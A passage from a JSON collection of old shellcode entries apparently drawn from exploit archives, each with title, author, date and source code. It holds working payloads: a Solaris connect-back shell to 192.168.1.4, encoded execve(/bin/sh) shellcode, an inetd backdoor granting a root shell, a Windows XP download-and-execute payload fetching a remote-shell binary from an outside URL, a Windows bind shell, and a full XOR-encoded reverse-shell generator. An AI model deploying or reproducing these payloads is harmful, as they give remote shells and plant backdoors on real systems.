\"\\x91\\xd0\\x20\\x08\"   /* ta      0x8                  */", "    \"\\x90\\x24\\x20\\x01\"   /* sub     %l0, 1, %o0          */", "    \"\\x94\\x10\\x20\\x01\"   /* mov     1, %o2               */", "    \"\\x91\\xd0\\x20\\x08\"   /* ta      0x8                  */", "    \"\\x90\\x24\\x20\\x01\"   /* sub     %l0, 1, %o0          */", "    \"\\x94\\x10\\x20\\x02\"   /* mov     2, %o2               */", "    \"\\x91\\xd0\\x20\\x08\"   /* ta      0x8                  */", "", "    /* Execve /bin/sh */", "    \"\\x94\\x1a\\x80\\x0a\"   /* xor     %o2, %o2, %o2        */", "    \"\\x21\\x0b\\xd8\\x9a\"   /* sethi   %hi(0x2f626800), %l0 */", "    \"\\xa0\\x14\\x21\\x6e\"   /* or      %l0, 0x16e, %l0      */", "    \"\\x23\\x0b\\xcb\\xdc\"   /* sethi   %hi(0x2f2f7000), %l1 */", "    \"\\xa2\\x14\\x63\\x68\"   /* or      %l1, 0x368, %l1      */", "    \"\\xd4\\x23\\xbf\\xfc\"   /* st      %o2, [%sp - 4]       */", "    \"\\xe2\\x23\\xbf\\xf8\"   /* st      %l1, [%sp - 8]       */", "    \"\\xe0\\x23\\xbf\\xf4\"   /* st      %l0, [%sp - 12]      */", "    \"\\x90\\x23\\xa0\\x0c\"   /* sub     %sp, 12, %o0         */", "    \"\\xd4\\x23\\xbf\\xf0\"   /* st      %o2, [%sp - 16]      */", "    \"\\xd0\\x23\\xbf\\xec\"   /* st      %o0, [%sp - 20]      */", "    \"\\x92\\x23\\xa0\\x14\"   /* sub     %sp, 20, %o1         */", "    \"\\x82\\x10\\x20\\x3b\"   /* mov     59, %g1              */", "    \"\\x91\\xd0\\x20\\x08\"   /* ta      0x8                  */", "", "    /* Exit */", "    \"\\x82\\x10\\x20\\x01\"   /* mov     1, %g1               */", "    \"\\x91\\xd0\\x20\\x08\";  /* ta      0x8                  */", "", "", "static char _solaris_code[] =", "    \"\\x90\\x10\\x20\\x02\\x92\\x10\\x20\\x02\\x94\\x1a\\x80\\x0a\\x82\\x10\\x20\\xe6\"", "    \"\\x91\\xd0\\x20\\x08\\xa0\\x02\\x20\\x01\\xa2\\x10\\x20\\xc0\\xa3\\x2c\\x60\\x08\"", "    \"\\xa2\\x14\\x60\\xa8\\xa3\\x2c\\x60\\x08\\xa2\\x14\\x60\\x01\\xa3\\x2c\\x60\\x08\"", "    \"\\xa2\\x14\\x60\\x01\\xe2\\x23\\xbf\\xf4\\xa2\\x10\\x20\\x02\\xe2\\x33\\xbf\\xf0\"", "    \"\\xa2\\x10\\x20\\x30\\xa3\\x2c\\x60\\x08\\xa2\\x14\\x60\\x39\\xe2\\x33\\xbf\\xf2\"", "    \"\\x92\\x23\\xa0\\x10\\x94\\x10\\x20\\x10\\x82\\x10\\x20\\xeb\\x91\\xd0\\x20\\x08\"", "    \"\\x90\\x24\\x20\\x01\\x92\\x10\\x20\\x09\\x94\\x1a\\x80\\x0a\\x82\\x10\\x20\\x3e\"", "    \"\\x91\\xd0\\x20\\x08\\x90\\x24\\x20\\x01\\x94\\x10\\x20\\x01\\x91\\xd0\\x20\\x08\"", "    \"\\x90\\x24\\x20\\x01\\x94\\x10\\x20\\x02\\x91\\xd0\\x20\\x08\\x94\\x1a\\x80\\x0a\"", "    \"\\x21\\x0b\\xd8\\x9a\\xa0\\x14\\x21\\x6e\\x23\\x0b\\xcb\\xdc\\xa2\\x14\\x63\\x68\"", "    \"\\xd4\\x23\\xbf\\xfc\\xe2\\x23\\xbf\\xf8\\xe0\\x23\\xbf\\xf4\\x90\\x23\\xa0\\x0c\"", "    \"\\xd4\\x23\\xbf\\xf0\\xd0\\x23\\xbf\\xec\\x92\\x23\\xa0\\x14\\x82\\x10\\x20\\x3b\"", "    \"\\x91\\xd0\\x20\\x08\\x82\\x10\\x20\\x01\\x91\\xd0\\x20\\x08\";", "", "int", "main(void)", "{", "    void (*code)() = (void *)_solaris_code;", "    ", "    _solaris_code[IP0] = 4;", "    _solaris_code[IP1] = 1;", "    _solaris_code[IP2] = 168;", "    _solaris_code[IP3] = 192;", "", "    _solaris_code[P0] = 0x2e;", "    _solaris_code[P1] = 0x16;", "", "    printf(\"Shellcode length: %d\\n\", strlen(_solaris_code));", "", "\t/* Connect to 192.168.1.4:5678 */", "    code();", "    return(1);", "}    ", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "Solaris/x86 - execve(/bin/sh) ToUpper Encoded Shellcode (84 bytes)", "Author": "anonymous", "Published": ": 2004-09-26", "Platform": "Solaris_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-113.php", "View": null, "code": ["/* ", " *  Solaris/x86", " *", " *  Used for toupper() evasion (look to the linux version for an ", " *  explanation and usage example). ", " */", " ", "char c0de[] = ", "/* main: */", "\"\\xeb\\x33\"                                /* jmp callz                */", "/* start: */", "\"\\x5e\"                                    /* popl %esi                */", "\"\\x8d\\x06\"                                /* leal (%esi), %eax        */", "\"\\x29\\xc9\"                                /* subl %ecx, %ecx          */", "\"\\x89\\xf3\"                                /* movl %esi, %ebx          */", "\"\\x89\\x5e\\x08\"                            /* movl %ebx, 0x08(%esi)    */", "\"\\xb1\\x07\"                                /* movb $0x07, %cl          */", "/* loopz: */", "\"\\x80\\x03\\x20\"                            /* addb $0x20, (%ebx)       */", "\"\\x43\"                                    /* incl %ebx                */", "\"\\xe0\\xfa\"                                /* loopne loopz             */", "\"\\x93\"                                    /* xchgl %eax, %ebx         */", "\"\\x29\\xc0\"                                /* subl %eax, %eax          */", "\"\\x89\\x5e\\x0b\"                            /* movl %ebx, 0x0b(%esi)    */", "\"\\x29\\xd2\"                                /* subl %edx, %edx          */", "\"\\x88\\x56\\x19\"                            /* movb %dl, 0x19(%esi)     */", "\"\\x89\\x56\\x07\"                            /* movl %edx, 0x07(%esi)    */", "\"\\x89\\x56\\x0f\"                            /* movl %edx, 0x0f(%esi)    */", "\"\\x89\\x56\\x14\"                            /* movl %edx, 0x14(%esi)    */", "\"\\xb0\\x3b\"                                /* movb $0x3b, %al          */", "\"\\x8d\\x4e\\x0b\"                            /* leal 0x0b(%esi), %ecx    */", "\"\\x89\\xca\"                                /* movl %ecx, %edx          */", "\"\\x52\"                                    /* pushl %edx               */", "\"\\x51\"                                    /* pushl %ecx               */", "\"\\x53\"                                    /* pushl %ebx               */", "\"\\x50\"                                    /* pushl %eax               */", "\"\\xeb\\x18\"                                /* jmp lcall                */", "/* callz: */", "\"\\xe8\\xc8\\xff\\xff\\xff\"                    /* call start               */", "", "\"\\x0f\\x42\\x49\\x4e\\x0f\\x53\\x48\"            /* /bin/sh -= 0x20          */", "\"\\x01\\x01\\x01\\x01\\x02\\x02\\x02\\x02\\x03\\x03\\x03\\x03\"", "/* lcall: */", "\"\\x9a\\x04\\x04\\x04\\x04\\x07\\x04\";", "", "# milw0rm.com [2004-09-26]"]},
{"Title": "Solaris/x86 - inetd Add Service + execve() Shellcode (201 bytes)", "Author": "anonymous", "Published": ": 2004-09-26", "Platform": "Solaris_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-114.php", "View": null, "code": ["/*", " *  Solaris/x86", " *", " *  Just execve()'s the following:", " *   \"echo \\\"ingreslock stream tcp nowait root /bin/sh sh -i\\\">/tmp/x;\"", " *   \"/usr/sbin/inetd -s /tmp/x; /bin/rm -f /tmp/x\";", " *", " *  for a trivial remote bd. Used in a few old Solaris/x86 remote exploits. ", " */", " ", "char c0de[] =", "\"\\xeb\\x3d\\x9a\\x24\\x24\\x24\\x24\\x07\\x24\\xc3\\x5e\\x29\\xc0\\x89\\x46\\xbf\\x88\\x46\\xc4\"", "\"\\x89\\x46\\x0c\\x88\\x46\\x17\\x88\\x46\\x1a\\x88\\x46\\x78\\x29\\xc0\\x50\\x56\\x8d\\x5e\\x10\"", "\"\\x89\\x1e\\x53\\x8d\\x5e\\x18\\x89\\x5e\\x04\\x8d\\x5e\\x1b\\x89\\x5e\\x08\\xb0\\x3b\\xe8\\xc6\"", "\"\\xff\\xff\\xff\\xff\\xff\\xff\\xe8\\xc6\\xff\\xff\\xff\\x01\\x01\\x01\\x01\\x02\\x02\\x02\\x02\"", "\"\\x03\\x03\\x03\\x03\\x04\\x04\\x04\\x04\"", "\"\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x20\\x2d\\x63\\x20\"", "\"echo \\\"ingreslock stream tcp nowait root /bin/sh sh -i\\\">/tmp/x;\"", "\"/usr/sbin/inetd -s /tmp/x; /bin/rm -f /tmp/x\";", "", "/* EOF */", "", "# milw0rm.com [2004-09-26]"]},
{"Title": "UnixWare - execve(/bin/sh) Shellcode (95 bytes)", "Author": "K2", "Published": ": 2004-09-26", "Platform": "UnixWare", "Download": "https://old.exploit-db.com/download/13503.c", "View": "https://old.exploit-db.com/raw/13503/", "code": ["/*", "   UnixWare", "   execve() of /bin/sh by K2", "*/", "", "char shell[] =", "  \"\\xeb\\x48\\x9a\\xff\\xff\\xff\\xff\\x07\\xff\\xc3\\x5e\\x31\\xc0\\x89\\x46\\xb4\"", "  \"\\x88\\x46\\xb9\\x88\\x46\\x07\\x89\\x46\\x0c\\x31\\xc0\\x50\\xb0\\x8d\\xe8\\xdf\"", "  \"\\xff\\xff\\xff\\x83\\xc4\\x04\\x31\\xc0\\x50\\xb0\\x17\\xe8\\xd2\\xff\\xff\\xff\"", "  \"\\x83\\xc4\\x04\\x31\\xc0\\x50\\x8d\\x5e\\x08\\x53\\x8d\\x1e\\x89\\x5e\\x08\\x53\"", "  \"\\xb0\\x3b\\xe8\\xbb\\xff\\xff\\xff\\x83\\xc4\\x0c\\xe8\\xbb\\xff\\xff\\xff\\x2f\"", "  \"\\x62\\x69\\x6e\\x2f\\x73\\x68\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\";   ", "", "", "# milw0rm.com [2004-09-26]"]},
{"Title": "Windows (XP) - Download File (http://www.elitehaven.net/ncat.exe) + Execute (nc.exe) + Null-Free Shellcode", "Author": "Peter Winter-Smith", "Published": ": 2004-09-26", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-146.php", "View": null, "code": ["; Nice theorhetically generic url download and execute", "; shellcode for Windows XP.", ";", "; Heck, atleast it saves you using tftp!", ";", "; Peter4020@hotmail.com", ";", "; nasmw -s -fbin -o download.s download.asm", "", "bits 32", "", "start:", "jmp short avoidnastynulls", "", "continue:", "pop edi\t\t\t\t; edi = 'urlmon.dll'", "mov esi, edi", "mov al, 0ffh", "repne scasb", "inc byte [edi-01h]\t\t; edi = string of url", "mov ebx, edi", "mov al, 0ffh", "repne scasb", "inc byte [edi-01h]\t\t; edi = path of download", "mov edx, edi", "repne scasb", "inc byte [edi-01h]", "push edx", "", "push ebx", "push edx", "push esi", "", "mov ebx, 0c25b5effh", "mov ecx, 0deadc0deh", "mov edi, 77e60101h", "", "trawlmem:", "inc edi", "mov al, 0ffh", "repne scasb", "jmp short checkbytes", "nop", "", "checkbytes:", "dec edi", "push dword [edi]", "pop esi", "cmp ebx, esi", "je short gotcha", "jmp short trawlmem", "", "jmp short pastpoint", "", "avoidnastynulls:", "jmp short data", "", "pastpoint:", "", "gotcha:", "lea eax, [edi-2eh]\t\t; get to start of loadlibrarya function", "call eax\t\t\t; call loadlibrarya", "", "pop edx", "pop ebx", "", "push edx", "xor ecx, ecx", "push ecx", "push ecx", "push edx\t\t\t; path of download", "push ebx\t\t\t; url of download", "push ecx", "", "mov ebx, 8d8d5602h", "mov ecx, 0badc0dedh", "mov edi, eax\t\t\t; eax = base of urlmon.dll", "", "trawlmem2:", "inc edi", "mov al, 002h", "repne scasb", "jmp short checkbytes2", "nop", "", "checkbytes2:", "dec edi", "push dword [edi]", "pop esi", "cmp ebx, esi", "je short gotcha2", "jmp short trawlmem2", "", "gotcha2:", "lea eax, [edi-1bh]\t\t; get to start of urldownloadtofilea function", "call eax\t\t\t; call urldownloadtofilea", "", "pop edx", "xor ecx, ecx", ";inc ecx", "push ecx", "push edx", "", "mov ebx, 0c458b66h", "mov ecx, 1337f00dh", "mov edi, 77e60101h", "", "trawlmem3:", "inc edi", "mov al, 066h", "repne scasb", "jmp short checkbytes3", "nop", "", "checkbytes3:", "dec edi", "push dword [edi]", "pop esi", "cmp ebx, esi", "je short gotcha3", "jmp short trawlmem3", "", "gotcha3:", "lea eax, [edi-16h]\t\t; get to start of winexec function", "call eax\t\t\t; call winexec", "", "mov ecx, 0deadc0deh", "infloop:\t\t\t; infinite loop; no crash when done", "inc ecx", "cmp ecx, 0badc0dedh", "loopnz infloop\t\t\t; if this slows you down too much, remove it!", "", "int 3h", "", "data:", "call continue", "db 'URLMON.DLL', 0ffh", "db 'http://www.elitehaven.net/ncat.exe', 0ffh\t; the file at this address spawns remote shell on port 9999", "db 'c:\\nc.exe', 0ffh", "", "; milw0rm.com [2004-09-26]"]},
{"Title": "Windows (XP SP1) - Bind (58821/TCP) Shell Shellcode (116 bytes)", "Author": "silicon", "Published": ": 2004-09-26", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-147.php", "View": null, "code": ["/* 116 bytes bindcode hardcoded for Windows XP SP1 */", "/* but you can change the address if you want */", "/* i made it pretty clear where they are  */", "/* the bindcode will bind to port 58821 */", "/* by silicon / silicon@chello.no */", "/* greetz to dtors.net :)", "", "#include <stdio.h>", "#include <winsock2.h>", "", "unsigned char bindcode[] = // 116 bytes bindcode for windows, port=58821, by silicon :)", "\"\\x83\\xC4\\xEC\\x33\\xC0\\x50\\x50\\x50\\x6A\\x06\"", "\"\\x6A\\x01\\x6A\\x02\\xB8\"", "\"\\x01\\x5A\\xAB\\x71\" // address of WSASocketA()", "\"\\xFF\\xD0\\x8B\\xD8\\x33\\xC0\\x89\\x45\\xF4\\xB0\"", "\"\\x02\\x66\\x89\\x45\\xF0\\x66\\xC7\\x45\\xF2\\xE5\"", "\"\\xC5\\x6A\\x10\\x8D\\x55\\xF0\\x52\\x53\\xB8\"", "\"\\xCE\\x3E\\xAB\\x71\" // address of bind()", "\"\\xFF\\xD0\\x6A\\x01\\x53\\xB8\"", "\"\\xE2\\x5D\\xAB\\x71\" // address of listen()", "\"\\xFF\\xD0\\x33\\xC0\\x50\\x50\\x53\\xB8\"", "\"\\x8D\\x86\\xAB\\x71\" // address of accept()", "\"\\xFF\\xD0\\x8B\\xD8\\xBA\"", "\"\\x1D\\x20\\xE8\\x77\" // address of SetStdHandle()", "\"\\x53\\x6A\\xF6\\xFF\\xD2\\x53\\x6A\\xF5\\xFF\\xD2\"", "\"\\x53\\x6A\\xF4\\xFF\\xD2\\xC7\\x45\\xFB\\x41\\x63\"", "\"\\x6D\\x64\\x8D\\x45\\xFC\\x50\\xB8\"", "\"\\x44\\x80\\xC2\\x77\" // address of system()", "\"\\xFF\\xD0\";", "", "int main(){", " WSADATA wsadata;", " WSAStartup(WINSOCK_VERSION,&wsadata);", " ((void (*)(void)) &bindcode)(); ", "}", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "Windows (XP/2000/2003) - Reverse (127.0.0.1:53/TCP) Shell Shellcode (275 bytes) (Generator)", "Author": "lion", "Published": ": 2004-10-25", "Platform": "Generator", "Download": "https://old.exploit-db.com/download/13528.c", "View": "https://old.exploit-db.com/raw/13528/", "code": ["/*", "*-----------------------------------------------------------------------", "* ", "* connectback_v32.c - Connect Back shellcode for Overflow exploit", "*", "* Copyright (C) 2000-2004 HUC All Rights Reserved.", "*", "* Author   : lion", "*          : lion@cnhonker.net", "*          : http://www.cnhonker.com", "*          :", "* Date     : 2003-08-15", "*          :", "* Update   : 2004-05-22 v3.2", "*          : 2004-05-05 v3.1 ", "*          : 2004-01-08 v3.0", "*          : 2003-09-10 v2.0 ", "*          : 2003-08-15 v1.0  ", "*          :", "* Tested   : Windows 2000/Windows XP/windows 2003", "*          :", "* Notice   : 1. \u00cd\u00a8\u00b9\u00fdpeb\u00c8\u00a1\u00b5\u00c3kernel32.dll\u00b5\u00d8\u00d6\u00b7\u00a1\u00a3", "*          : 2. \u00cd\u00a8\u00b9\u00fd\u00ba\u00af\u00ca\u00fd\u00b5\u00c4hash\u00d6\u00b5\u00c0\u00b4\u00bd\u00f8\u00d0\u00d0\u00b1\u00c8\u00bd\u00cf\u00a3\u00ac\u00b4\u00fa\u00cc\u00e6GetProcAddress\u00c8\u00a1\u00b5\u00c3\u00ba\u00af\u00ca\u00fd\u00b5\u00d8\u00d6\u00b7\u00a3\u00ac\u00bd\u00da\u00ca\u00a1\u00ba\u00af\u00ca\u00fd\u00c3\u00fb\u00d5\u00bc\u00d3\u00c3\u00b5\u00c4\u00bf\u00d5\u00bc\u00e4\u00a1\u00a3", "*          : 3. \u00c0\u00fb\u00d3\u00c3\u00d1\u00ad\u00bb\u00b7\u00bb\u00f1\u00c8\u00a1hash\u00d6\u00b5\u00ba\u00cd\u00ba\u00af\u00ca\u00fd\u00b5\u00d8\u00d6\u00b7\u00a3\u00ac\u00bd\u00da\u00ca\u00a1\u00bf\u00d5\u00bc\u00e4\u00a1\u00a3", "*          : 4. \u00b7\u00b4\u00c1\u00ac\u00b6\u00cb\u00bf\u00da\u00c0\u00b4\u00bb\u00f1\u00b5\u00c3shell\u00a1\u00a3", "*          : 5. \u00d3\u00c3vc6\u00bf\u00c9\u00d2\u00d4\u00c3\u00fc\u00c1\u00ee\u00d0\u00d0\u00d6\u00b1\u00bd\u00d3\u00b1\u00e0\u00d2\u00eb\u00a3\u00ac\u00b7\u00bd\u00b1\u00e3\u00d0\u00de\u00b8\u00c4\u00a1\u00a3", "*          : 6. win2000/winxp/win2003 \u00cf\u00c2\u00b2\u00e2\u00ca\u00d4\u00b3\u00c9\u00b9\u00a6\u00a1\u00a3", "*          : 7. \u00d4\u00da\u00ca\u00b9\u00b4\u00fa\u00c2\u00eb\u00d2\u00d7\u00d3\u00da\u00d0\u00de\u00b8\u00c4\u00b5\u00c4\u00cd\u00ac\u00ca\u00b1\u00d7\u00ee\u00b4\u00f3\u00d3\u00c5\u00bb\u00af\u00ce\u00aa\u00b4\u00f3\u00d0\u00a1275 bytes\u00a1\u00a3", "*          :", "* Complie  : cl connectback_v32.c", "*          :", "* Reference: http://www.lsd-pl.net/documents/winasm-1.0.1.pdf", "*          : http://www.metasploit.com/shellcode.html", "*", "*------------------------------------------------------------------------", "*/", "", "#include <stdio.h>", "#include <winsock2.h>", "", "#pragma comment(lib, \"ws2_32\")", "", "// Use for find the ASM code", "#define PROC_BEGIN                     __asm _emit 0x90 __asm  _emit 0x90\\", "                                       __asm _emit 0x90 __asm  _emit 0x90\\", "                                       __asm _emit 0x90 __asm  _emit 0x90\\", "                                       __asm _emit 0x90 __asm  _emit 0x90", "#define PROC_END                       PROC_BEGIN", "#define SEARCH_STR                     \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\"", "#define SEARCH_LEN                     8", "#define MAX_SC_LEN                     2048", "#define HASH_KEY                       13", "", "// Define Decode Parameter", "#define DECODE_LEN                     21", "#define SC_LEN_OFFSET                  7", "#define ENC_KEY_OFFSET                 11", "#define ENC_KEY                        0x99", "", "", "// Define Function Addr", "#define ADDR_LoadLibraryA              [esi]", "#define ADDR_CreateProcessA            [esi+4]", "#define ADDR_ExitProcess               [esi+8]", "#define ADDR_WaitForSingleObject       [esi+12]", "#define ADDR_WSASocketA                [esi+16]", "#define ADDR_connect                   [esi+20]", "#define ADDR_closesocket               [esi+24]", "//#define ADDR_WSAStartup                [esi+28]", "//#define ADDR_CMD                       [esi+32]", "", "// Need functions", "unsigned char functions[100][128] =         ", "{                                           // [esi] stack layout", "    // kernel32 4                           // 00 kernel32.dll", "    {\"LoadLibraryA\"},                       //    [esi]", "    {\"CreateProcessA\"},                     //    [esi+4]       ", "    {\"ExitThread\"},                         //    [esi+8]", "    //{\"ExitProcess\"},", "    //{\"TerminateProcess\"},", "    {\"WaitForSingleObject\"},                //    [esi+12] ", "    //{\"WaitForSingleObjectEx\"},", "", "    // ws2_32  3                            // 01 ws2_32.dll", "    {\"WSASocketA\"},                         //    [esi+16]     ", "    {\"connect\"},                            //    [esi+20]\t\t", "    {\"closesocket\"},                        //    [esi+24]", "    //{\"WSAStartup\"},                       //    [esi+28]", "    {\"\"},", "};", "", "// Shellcode string", "unsigned char  sc[1024] = {0};", "", "// ASM shellcode main function", "void    ShellCode();", "", "// Get function hash", "static DWORD __stdcall GetHash ( char *c )", "{", "    DWORD h = 0;", "    ", "    while ( *c )", "    {", "        __asm ror h, HASH_KEY", "        ", "        h += *c++;", "    }", "    return( h );", "}", "", "// Print Shellcode ", "void PrintSc(unsigned char *sc, int len)", "{", "    int    i,j;", "    char *p;", "    char msg[6];", "    ", "    //printf(\"/* %d bytes */\\n\", buffsize);", "    ", "    // Print general shellcode", "    for(i = 0; i < len; i++)", "    {", "        if((i%16)==0)", "        {", "            if(i!=0)", "                printf(\"\\\"\\n\\\"\");", "            else", "                printf(\"\\\"\");", "        }", "        ", "        //printf(\"\\\\x%.2X\", sc[i]);", "        ", "        sprintf(msg, \"\\\\x%.2X\", sc[i] & 0xff);", "", "        for( p = msg, j=0; j < 4; p++, j++ )", "        {", "            if(isupper(*p))", "                printf(\"%c\", _tolower(*p));", "            else", "                printf(\"%c\", p[0]);", "        }", "    }", "    ", "    printf(\"\\\";\\n\");", "}", "", "", "void Make_ShellCode()", "{", "    unsigned char  *pSc_addr;", "    unsigned int   Sc_len;", "    unsigned int   Enc_key=ENC_KEY;", "    unsigned long  dwHash[100];", "    unsigned int   dwHashSize;", "", "    int i,j,k,l;", "    ", "    ", "    // Get functions hash", "    printf(\"[+] Get functions hash strings.\\r\\n\");", "    for (i=0;;i++) ", "    {", "        if (functions[i][0] == '\\x0') break;", "", "        dwHash[i] = GetHash((char*)functions[i]);", "        printf(\"\\t%.8X\\t%s\\n\", dwHash[i], functions[i]);", "    }", "    dwHashSize = i*4;", "", "", "    // Deal with shellcode", "    pSc_addr = (unsigned char *)ShellCode;", "    ", "    for (k=0;k<MAX_SC_LEN;++k ) ", "    {", "        if(memcmp(pSc_addr+k,SEARCH_STR, SEARCH_LEN)==0) ", "        {", "            break;", "        }", "    }", "    pSc_addr+=(k+SEARCH_LEN);               // Start of the ShellCode", "    ", "    for (k=0;k<MAX_SC_LEN;++k) ", "    {", "        if(memcmp(pSc_addr+k,SEARCH_STR, SEARCH_LEN)==0) {", "            break;", "        }", "    }", "    Sc_len=k;                               // Length of the ShellCode", "    ", "    memcpy(sc, pSc_addr, Sc_len);           // Copy shellcode to sc[]", "", "", "    // Add functions hash", "    memcpy(sc+Sc_len, (char *)dwHash, dwHashSize);", "    Sc_len += dwHashSize;", "", "", "    // Print the size of shellcode.", "    printf(\"[+] %d + %d = %d bytes shellcode\\n\", Sc_len-DECODE_LEN, DECODE_LEN, Sc_len);", "", "    // Print the ip/port offset", "    for(k=0; k <= Sc_len-3; ++k)", "    {", "        if(sc[k] == 0x00 && sc[k+1] == 0x35)", "            printf(\"/* port offset: %d + %d = %d */\\r\\n\", k-DECODE_LEN, DECODE_LEN, k);", "        if(sc[k] == 0x7F && sc[k+3] == 0x01)", "            printf(\"/* ip offset: %d + %d = %d */\\r\\n\", k-DECODE_LEN, DECODE_LEN, k);", "    }", "", "/*               ", "    for(i=DECODE_LEN; i<Sc_len; i++)", "    {", "       sc[i] ^= Enc_key;", "    }", "*/", "", "    // Print shellcode", "    //PrintSc(sc, Sc_len); ", "    ", "", "    // Deal with find the right XOR byte", "    for(i=0xff; i>0; i--)", "    {", "        l = 0;", "        for(j=DECODE_LEN; j<Sc_len; j++)", "        {", "            if ( ", "                   ((sc[j] ^ i) == 0x26) || //%", "                   ((sc[j] ^ i) == 0x3d) || //=", "                   ((sc[j] ^ i) == 0x3f) || //?", "                   ((sc[j] ^ i) == 0x40) || //@", "                   ((sc[j] ^ i) == 0x00) ||", "                   ((sc[j] ^ i) == 0x0D) ||", "                   ((sc[j] ^ i) == 0x0A) ", "                )                           // Define Bad Characters", "            {", "                l++;                        // If found the right XOR byte\u00a3\u00acl equals 0", "                break;", "            };", "        }", "    ", "        if (l==0)", "        {", "            Enc_key = i;", "            ", "            //printf(\"[+] Find XOR Byte: 0x%02X\\n\", i);", "            for(j=DECODE_LEN; j<Sc_len; j++)", "            {", "                sc[j] ^= Enc_key;", "            }", "", "            break;                          // If found the right XOR byte, Break", "        }", "    }", "", "    // Deal with not found XOR byte", "    if (l!=0)", "   {", "        printf(\"[-] No xor byte found!\\r\\n\");", "        exit(-1);", "    }", "", "    // Deal with DeCode string", "    //memcpy(&sc[SC_LEN_OFFSET], &Sc_len, 2);", "    *(unsigned char *)&sc[SC_LEN_OFFSET] = Sc_len-DECODE_LEN;", "    *(unsigned char *)&sc[ENC_KEY_OFFSET] = Enc_key;", "", "    // Print decode", "    printf(\"/* %d bytes decode */\\r\\n\", DECODE_LEN);", "    PrintSc(sc, DECODE_LEN);", "", "    // Print shellcode", "    printf(\"/* %d bytes shellcode, xor with 0x%02x */\\r\\n\", Sc_len-DECODE_LEN, Enc_key);", "    PrintSc((char*)sc+DECODE_LEN, Sc_len-DECODE_LEN);", "}", "", "void main()", "{", "    DWORD    addr;", "    WSADATA        wsa;", "    ", "    WSAStartup(MAKEWORD(2,2),&wsa);", "    ", "    Make_ShellCode();", "", "    addr = (DWORD)&sc;", "", "    __asm", "    {", "        jmp addr", "    }", "", "    return;", "}", "", "// ShellCode function", "void ShellCode()", "{", "    __asm", "    {", "        PROC_BEGIN                          // C macro to begin proc", "//--------------------------------------------------------------------", "//", "// DeCode", "//", "//--------------------------------------------------------------------", "        jmp     short decode_end", "        ", "decode_start:", "        pop     ebx                         // Decode start addr (esp -> ebx)", "        dec     ebx", "        xor     ecx,ecx", "        mov     cl,0xFF                     // Decode len", "        ", "    decode_loop:", "        xor     byte ptr [ebx+ecx],0x99     // Decode key", "        loop    decode_loop", "        jmp     short decode_ok", "", "decode_end:", "        call    decode_start", "        ", "decode_ok:", "", "//--------------------------------------------------------------------", "//", "// ShellCode", "//", "//--------------------------------------------------------------------", "        jmp     sc_end", "        ", "sc_start:         ", "        pop     edi                         // Hash string start addr (esp -> edi)", "", "        // Get kernel32.dll base addr", "        mov     eax, fs:0x30                // PEB", "        mov     eax, [eax+0x0c]             // PROCESS_MODULE_INFO", "        mov     esi, [eax+0x1c]             // InInitOrder.flink ", "        lodsd                               // eax = InInitOrder.blink", "        mov     ebp, [eax+8]                // ebp = kernel32.dll base address", "", "        mov     esi, edi                    // Hash string start addr -> esi", "    ", "        // Get function addr of kernel32", "        push    4", "        pop     ecx", "        ", "    getkernel32:", "        call    GetProcAddress_fun", "        loop    getkernel32", "", "        // Get ws2_32.dll base addr", "        push    0x00003233", "        push    0x5f327377", "        push    esp", "        call    ADDR_LoadLibraryA          // LoadLibraryA(\"ws2_32\");", "        ", "        //mov     ebp, eax                   // ebp = ws2_32.dll base address", "        xchg    eax, ebp", "", "        // Get function addr of ws2_32", "        push    3", "        pop     ecx", "", "    getws2_32:", "        call    GetProcAddress_fun", "        loop    getws2_32", "", "/*     ", "//LWSAStartup:", "        sub     esp, 400", "        push    esp", "        push    0x101", "        call    ADDR_WSAStartup             // WSAStartup(0x101, &WSADATA);", "*/", "", "//LWSASocketA:", "        push    ecx", "        push    ecx", "        push    ecx", "        push    ecx", "", "        push    1", "        push    2", "        call    ADDR_WSASocketA             // s=WSASocketA(2,1,0,0,0,0);", "", "        //mov     ebx, eax                    // socket -> ebx", "        xchg    eax, ebx", "", "//Lconnect:", "        push    0x0100007F \t\t\t\t\t// host: 127.0.0.1 ", "        push    0x35000002 \t\t\t\t\t// port: 53 ", "        mov     ebp, esp", "        ", "        push    0x10                        // sizeof(sockaddr_in)", "        push    ebp                         // sockaddr_in address", "        push    ebx                         // socket s", "        call    ADDR_connect                // connect(s, name, sizeof(name));", "", "        // if connect failed , exit", "        test    eax, eax", "        jne     Finished", "\t\t", "//        xor     eax, eax", "        ", "        // allot memory for STARTUPINFO, PROCESS_INFORMATION", "        mov     edi, esp", "           ", "        // zero out SI/PI", "        push    0x12", "        pop     ecx", "    stack_zero:", "        stosd", "        loop    stack_zero", "        ", "        //mov     byte ptr [esp+0x10], 0x44   // si.cb = sizeof(si)", "        //inc     byte ptr [esp+0x3C]         // si.dwFlags", "        //inc     byte ptr [esp+0x3D]         // si.wShowWindow", "        //mov     [esp+0x48], ebx             // si.hStdInput = s", "        //mov     [esp+0x4C], ebx             // si.hStdOutput = s", "        //mov     [esp+0x50], ebx             // si.hStdError = s", "        ", "        mov     word ptr  [esp+0x3c], 0x0101", "        xchg    eax, ebx", "        stosd", "        stosd", "        stosd", "    ", "        mov     edi, esp", "    ", "        // push \"cmd\"", "        push    0x00646d63                  // \"cmd\"", "        mov     ebp, esp", "", "        push    eax                         // socket", "\t\t", "//LCreateProcess:", "        lea     eax, [edi+0x10]                    ", "        push    edi                         // pi", "        push    eax                         // si", "        push    ecx                         // lpCurrentDirectory", "        push    ecx                         // lpEnvironment", "        push    ecx                         // dwCreationFlags", "        push    1                           // bInheritHandles", "        push    ecx                         // lpThreadAttributes", "        push    ecx                         // lpProcessAttributes", "        push    ebp                         // lpCommandLine =  \"cmd\"", "        push    ecx                         // lpApplicationName NULL", "        call    ADDR_CreateProcessA         // CreactProcessA(NULL,\"CMD\",0,0,1,0,0,0,si, pi);", "    ", "//LWaitForSingleObject:", "        //push    1   ", "        push    0xFFFFFFFF", "        push    dword ptr [edi]", "        call    ADDR_WaitForSingleObject    // WaitForSingleObject(Handle, time) ;", "", "//LCloseSocket:", "        //push    ebx", "        call    ADDR_closesocket            // closesocket(c);", "", "Finished:", "        //push    1", "        call    ADDR_ExitProcess            // 